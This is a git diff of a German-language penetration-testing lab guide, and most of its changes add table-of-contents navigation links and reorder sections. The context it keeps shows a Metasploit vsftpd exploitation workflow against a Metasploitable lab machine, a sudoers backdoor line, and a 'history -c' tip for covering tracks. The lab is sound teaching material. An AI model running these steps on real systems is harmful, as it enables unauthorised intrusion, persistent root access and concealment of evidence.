@@ -20,7 +20,16 @@ Für den Test starten wir über Virtualbox alle drei Maschinen (Kali Linux, Meta
 - [Empfehlung](#empfehlung)
 - [Haftungsausschluss](#haftungsausschluss)
 
----
+
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ## Ziel
 
@@ -31,6 +40,15 @@ Für den Test starten wir über Virtualbox alle drei Maschinen (Kali Linux, Meta
 
 
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Testumgebung
 
 - **Angreifer:** Kali Linux (z. B. 192.168.1.100)
@@ -38,6 +56,15 @@ Für den Test starten wir über Virtualbox alle drei Maschinen (Kali Linux, Meta
 - **Firewall/Gateway:** pfSense (z. B. 192.168.1.1)
 - **Netzbereich:** 192.168.1.0/24
 
+
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## 1. Netzwerkerkennung via Nmap
@@ -137,6 +164,15 @@ deine IP-Adresse).
 In unserem [nmap Guide](/02-network-security/tools/nmap.md) erhältst du mehr Infos.
 
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## 3. Exploitation mit Metasploit
 
 Wenn du möchtest, kannst du ab hier mit einem zweiten Terminal starten, um auf msfconsole zuzugreifen.
@@ -151,6 +187,15 @@ msfconsole
 
 Nachdem msfconsole erfolgreich gestartet ist, wirst du merken, dass sich die Anzeige geändert hat. Das liegt daran, dass wir nun in der Shell des Programm `msfconsole` sind.
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ### 3.2 Nach passendem Exploit-Modul suchen
 
 Da wir den `Port 21` angreifen möchten, suchen wir nach der `VERSION`. 
@@ -160,13 +205,17 @@ Um das passende Exploit-Modul zu suchen, gib einfach in die `msfconsole` folgend
 search vsftpd
 ```
 
+
+![Exploit-Modul suchen](/09-practice-labs/ressources/pictures/metasploit-vsftpd4.png)
+
+
+
 <div align=right>
 
 [↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
 
 </div>
 
-![Exploit-Modul suchen](/09-practice-labs/ressources/pictures/metasploit-vsftpd4.png)
 
 ### 3.3 Exploit nutzen
 
@@ -195,11 +244,7 @@ Wir haben `msfconsole` geöffnet und nach der Version gesucht und waren erfolgre
 
 **Was jetzt?**
 
-### 3.4 Exploit Optionen ansehen
 
-Mit dem Befehl `option` siehst du, welche Möglichkeiten du mit diesem Exploit hast. 
-
-![msfconsole option-Befehl](/09-practice-labs/ressources/pictures/metasploit-vsftpd6.png)
 
 <div align=right>
 
@@ -207,7 +252,24 @@ Mit dem Befehl `option` siehst du, welche Möglichkeiten du mit diesem Exploit h
 
 </div>
 
+
+### 3.4 Exploit Optionen ansehen
+
+Mit dem Befehl `option` siehst du, welche Möglichkeiten du mit diesem Exploit hast. 
+
+![msfconsole option-Befehl](/09-practice-labs/ressources/pictures/metasploit-vsftpd6.png)
+
+
 Für uns sind hier an dieser Stelle nur der `RHOST` und `RPORT` wichtig, da wir nicht über einen Proxy laufen oder sonst locale Clients haben.
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### 3.5 Exploit konfigurieren
 
@@ -225,6 +287,15 @@ set RPORT 21
 Du könntest noch einmal den Befehl `options` eingeben, um zu überprüfen, ob deine Konfigurationen überommen worden sind, aber dies Bedarf es im Regelfall nicht.
 
 **Bist du bereit?**
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### 3.6 Run that Motherf***
 
@@ -251,6 +322,15 @@ set RHOSTS 192.168.1.102
 set RPORT 21
 exploit
 ```
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### 3.7 Exploit überprüfen
 
@@ -362,6 +442,15 @@ echo "redteam ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 ```
 
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## 5. Cleanup & Hinweise
 
 - Für realistische Tests kann `history -c` verwendet werden, um Spuren zu verwischen.
@@ -392,6 +481,15 @@ script pentest_session.log
 
 
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Tools benötigt
 
 - `nmap`
@@ -405,11 +503,29 @@ script pentest_session.log
 
 
 
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Empfehlung
 
 Nutze `iptables` oder `pfSense` Logging, um zu beobachten, wie Angriffe in der Firewall sichtbar werden. 
 Dies ist nützlich für spätere Blue Team-Analysen.
 
+
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Haftungsausschluss
@@ -424,12 +540,6 @@ Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und
 [Disclaimer](/00-disclaimer/disclaimer.md)
 
 --- 
-
-<div align=right>
-
-[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
-
-</div>
 
 Stay curious – stay secure. 🔐
 
